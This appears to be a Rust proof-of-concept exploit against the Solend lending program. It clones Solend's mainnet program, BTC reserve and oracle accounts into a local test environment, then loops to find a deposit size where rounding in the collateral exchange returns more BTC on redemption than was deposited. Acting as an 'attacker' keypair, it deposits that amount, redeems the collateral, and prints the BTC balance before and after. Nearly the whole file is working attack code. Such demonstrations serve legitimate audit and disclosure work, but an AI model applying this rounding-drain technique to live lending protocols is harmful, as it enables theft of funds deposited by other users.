use std::str::FromStr;
use poc_framework::solana_program::pubkey::Pubkey;
use poc_framework::{keypair, LocalEnvironment, solana_program};
use poc_framework::solana_sdk::system_program;
use poc_framework::solana_client::rpc_client::RpcClient;
use poc_framework::solana_program::native_token::sol_to_lamports;
use poc_framework::solana_program::program_pack::Pack;
use poc_framework::solana_sdk::{
    commitment_config::CommitmentConfig,
    signature::{Keypair, Signer},
};

use poc_framework::solana_sdk::sysvar::clock::Clock;
use poc_framework::spl_associated_token_account::get_associated_token_address;
use poc_framework::solana_client;
use poc_framework::solana_sdk::account::Account;
use solend_token_lending::state::{Reserve, ReserveLiquidity};
use solend_token_lending::state::Obligation;
use poc_framework::Environment;
use solend_token_lending;
use spl_token::state::Account as SPLAccount;

pub fn demo002() {
    // clone state with BTC reserve from cluster

    let solend_program_key =
        Pubkey::from_str("So1endDq2YkqhipRh3WViPa8hdiSpxWy6z3Z6tMCpAo").unwrap();
    let lending_market_key =
        Pubkey::from_str("4UpD2fh7xH3VP9QQaXtsS1YY3bxzWhtfpks7FatyKvdY").unwrap();
    // 这个market account的地址可以从下面的链接看到:
    // https://solscan.io/tx/N2KLXtTaBsgjpnymeZJYNxJo7ZXmQ3RLsDGhTRUbq9d2DYND8VviTe4PyRUCg6xZuz5ZqYmH8dCTuum8x5CGGTz

    // BTC reserve
    let reserve_key = Pubkey::from_str("GYzjMCXTDue12eUGKKWAqtF5jcBYNmewr6Db6LaguEaX").unwrap();

    let url = "https://solana-api.projectserum.com".to_string();
    let mainnet_client = RpcClient::new_with_commitment(url, CommitmentConfig::confirmed());
    let data = mainnet_client.get_account(&reserve_key).unwrap().data;

    let reserve = Reserve::unpack(&data).unwrap();
    println!("{}", reserve.lending_market);

// accounts we will use
    let attacker = keypair(0);
    let obligation = keypair(1);
    let liquidity_ata =
        get_associated_token_address(&attacker.pubkey(), &reserve.liquidity.mint_pubkey);
    let collateral_ata =
        get_associated_token_address(&attacker.pubkey(), &reserve.collateral.mint_pubkey);

    let mut env = LocalEnvironment::builder()
        // clone Solend program and state
        .clone_upgradable_program_from_cluster(&mainnet_client, solend_program_key)
        .clone_accounts_from_cluster(
            &[
                lending_market_key,
                reserve_key,
                reserve.collateral.mint_pubkey,
                reserve.collateral.supply_pubkey,
                reserve.liquidity.mint_pubkey,
                reserve.liquidity.supply_pubkey,
                reserve.liquidity.pyth_oracle_pubkey,
                reserve.liquidity.switchboard_oracle_pubkey,
                reserve.config.fee_receiver,
            ],
            &mainnet_client,
        )
        // give us some SOL to work with
        .add_account_with_lamports(
            attacker.pubkey(),
            system_program::ID,
            sol_to_lamports(100.0),
        )
        // and some BTC
        .add_associated_account_with_tokens(
            attacker.pubkey(),
            reserve.liquidity.mint_pubkey,
            10_000_000,
        )
        // initialize empty collateral account
        .add_associated_account_with_tokens(attacker.pubkey(), reserve.collateral.mint_pubkey, 0)
        .build();
    // let clock = solana_program::sysvar::;
    // let clock = solana_program::sysvar::clock::Clock::get();

    // let clock = mainnet_client.get_account(&clock::ID).unwrap();
    // env.bank.store_account(&Clock::ID, &clock.into());


    // create obligation

    env.create_account_rent_excempt(&obligation, Obligation::LEN, solend_program_key);
    env.execute_as_transaction(
        &[solend_token_lending::instruction::init_obligation(
            solend_program_key,
            obligation.pubkey(),
            lending_market_key,
            attacker.pubkey(),
        )],
        &[&attacker],
    );



    // refresh reserve
    env.execute_as_transaction(
        &[
            solend_token_lending::instruction::refresh_reserve(
                solend_program_key,
                reserve_key,
                reserve.liquidity.pyth_oracle_pubkey,
                reserve.liquidity.switchboard_oracle_pubkey,
            ),
            solend_token_lending::instruction::refresh_obligation(
                solend_program_key,
                obligation.pubkey(),
                vec![],
            ),
        ],
        &[],
    );
    let reserve: Reserve = env.get_unpacked_account(reserve_key).unwrap();



    // compute amounts where rounding leads to free money
    let mut i = 0;
    let (input, collateral_amount, output) = loop {
        let mut r = reserve.clone();
        let collateral_amount = r.deposit_liquidity(i).unwrap();
        let output = r.redeem_collateral(collateral_amount).unwrap();
        if output > i {
            break (i, collateral_amount, output);
        }
        i += 1;
    };
    println!("{},{},{},{}", i, collateral_amount,output,input);
    println!(
        "Amount before: {} BTC",
        env.get_unpacked_account::<SPLAccount>(liquidity_ata)
            .unwrap()
            .amount as f64
            / 1_000_000.0
    );
    println!("Using {} BTC", input as f64 / 1_000_000.0);

// deposit and withdraw btc
    env.execute_as_transaction(
        &[
            // deposit
            solend_token_lending::instruction::deposit_reserve_liquidity(
                solend_program_key,
                input,
                liquidity_ata,
                collateral_ata,
                reserve_key,
                reserve.liquidity.supply_pubkey,
                reserve.collateral.mint_pubkey,
                lending_market_key,
                attacker.pubkey(),
            ),
            // refresh again
            solend_token_lending::instruction::refresh_reserve(
                solend_program_key,
                reserve_key,
                reserve.liquidity.pyth_oracle_pubkey,
                reserve.liquidity.switchboard_oracle_pubkey,
            ),
            solend_token_lending::instruction::refresh_obligation(
                solend_program_key,
                obligation.pubkey(),
                vec![],
            ),
            // withdraw
            solend_token_lending::instruction::redeem_reserve_collateral(
                solend_program_key,
                collateral_amount,
                collateral_ata,
                liquidity_ata,
                reserve_key,
                reserve.collateral.mint_pubkey,
                reserve.liquidity.supply_pubkey,
                lending_market_key,
                attacker.pubkey(),
            ),
        ],
        &[&attacker],
    );

    println!(
        "Amount after: {} BTC",
        env.get_unpacked_account::<SPLAccount>(liquidity_ata)
            .unwrap()
            .amount as f64
            / 1_000_000.0
    );
}